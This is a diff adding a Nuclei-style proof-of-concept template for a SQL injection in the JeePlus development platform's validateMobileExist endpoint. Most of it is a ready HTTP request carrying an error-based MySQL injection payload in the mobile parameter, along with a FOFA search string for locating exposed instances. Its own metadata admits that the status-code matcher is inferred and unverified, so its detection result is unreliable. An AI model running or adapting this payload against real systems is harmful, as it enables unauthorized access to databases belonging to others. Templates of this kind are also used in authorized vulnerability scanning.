@@ -1,0 +1,44 @@
+id: poc-bafc0e388a3f4767beaf
+info:
+  name: JeePlus快速开发平台validateMobileExistSQL注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bafc0e388a3f4767beaf186b471d7dc9
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bafc0e388a3f4767beaf186b471d7dc9
+    fofa: + fofa`app="JeePlus"`
+http:
+- raw:
+  - 'GET /a/sys/user/validateMobileExist?&mobile=1%27+AND+GTID_SUBSET%28CONCAT%280x71626b7171%2C%28SELECT+%28ELT%285680%3D5680%2C1%29%29%29%2C0x7176767671%29%2C5680%29--+ywwp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Accept-Encoding: gzip
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /a/sys/user/validateMobileExist?&mobile=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Accept-Encoding: gzip
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
